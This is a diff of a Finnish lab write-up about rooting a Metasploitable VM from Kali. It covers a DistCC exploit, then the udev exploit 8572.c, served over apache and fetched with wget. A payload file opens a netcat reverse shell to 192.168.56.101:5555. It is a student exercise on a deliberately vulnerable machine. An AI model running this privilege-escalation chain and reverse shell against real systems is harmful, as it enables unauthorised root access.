@@ -32,34 +32,37 @@ Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show o
 
 ![image](https://github.com/user-attachments/assets/552fe8f1-b26f-4f6b-afc1-3bd457a3b2ca)
 
-Miten pääsisin rootiin? Etsin Youtubesta ohjevideon https://www.youtube.com/watch?v=DoUZFHwZntY.
+Miten pääsisin rootiin? Etsin Youtubesta ohjevideon [https://www.youtube.com/watch?v=DoUZFHwZntY](https://www.youtube.com/watch?v=DoUZFHwZntY).
 
-ps aux 
-dpkg -l |grep "udev"
-Kalilla searchsploit udev
-sudo systemctl start apache2
-sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html
-cd /var/www/html/
-ls
+Pääsin exploitilla daemon-käyttäjälle, ja silläkin pystyi antamaan tiettyjä komentoja. Seuraavaksi oli aika kaapata sudo-oikeudet.
 
-Metasploitablessa daemonina:
-sudo wget 192.168.56.101/8572.c -O msp2.c
-ls
-touch run
-ls
-echo '#½/bin/sh' > run
-echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run
-cat run
-gcc msp2.c -o msp2
-ls
-cat /proc/net/netlink Pid: 2406
+Tarkastin päällä olevat prosessit komennolla ``ps aux``. Näistä tiedoista greppasin ``dpkg -l |grep "udev"```. Tässä on heikko kohta, jota hyödyntää sudo-oikeuksien saamiseksi.
 
 Kalilla:
-nc -lvnp 5555
+- komennolla ``searchsploit udev`` etsin udev-exploiteja exploitdb-tietokannasta. Näistä valitsin ohjeen mukaan 8572.c:n.
+- Käynnistin apache2-palvelimen komennolla ``sudo systemctl start apache2``.
+- Kopioin udev-exploitin toiseen kansioon ``sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html``
+- Siirryin kansioon ``cd /var/www/html/``.
+- Tarkastin, että tiedosto löytyi kansiosta ``ls``.
 
-Metasploitablessa:
-chmod +x msp2
-./msp2 2406
+Metasploitablessa daemonina (auki toisella komentorivillä Kalillla):
+- Latasin apache-palvelimelta tiedoston ja nimesin sen msp2.c ``wget 192.168.56.101/8572.c -O msp2.c``
+- Tarkistin, että tiedosto latautui ``ls``
+- Loin tiedoston run ``touch run``
+-Tarkistin, että tiedosto löytyi ``ls``
+- run-tiedostoon lisäsin koodia ``echo '#½/bin/sh' > run`` ja ``echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run`` (5555 on Kalin portti, jota kautta yhteys otetaan)
+- Tarkistin, että tiedostossa luki mitä kirjoitin ``cat run``: tämä tiedosto on payload, joka liitetään udev-exploitiin
+- ``gcc msp2.c -o msp2`` Komennolla käännetään ohjelma ja nimetään se msp2, nyt sen voi suorittaa Linux-ympäristössä
+- ``cat /proc/net/netlink`` sain prosessin Pid: 2406, tätä tarvitsee seuraavaksi
+
+Kalilla:
+- ``nc -lvnp 5555`` komennolla laitettiin netcat kuuntelemaan porttia 5555
+
+Metasploitablessa daemonina:
+- muokkasin tiedoston käyttöoikeuksia ``chmod +x msp2``
+- suoritin tiedoston ``./msp2 2406``
+
+  Nyt Kali on root Metasploitablessa, yhteys on luotu netcatilla.
 
 ![image](https://github.com/user-attachments/assets/aef6919d-3b21-462e-84f5-3cf9b7b0145e)
 
@@ -71,7 +74,7 @@ Lähdekoodin löysin ``/usr/share/metasploit-famework/modules/exploits/unix/misc
 
 [https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html](https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html)
 
-Exploitin kriittinen osa on dist_cmd-kohta, joka huijaa DistCC luulemaan, että komento on käännöskomento. Tässä vaiheessa payload suoritetaan etäkoneella.
+Hyökkäys käynnistyy, jos haavoittuvuus havaitaan def check-kohdassa echolla "echo #{r}" ->  if out && out.index(r) return Exploit::CheckCode::Vulnerable. Exploitin kriittinen osa on dist_cmd-kohta,  payload.encoded. Tässä vaiheessa payload suoritetaan etäkoneella.
 
 
 
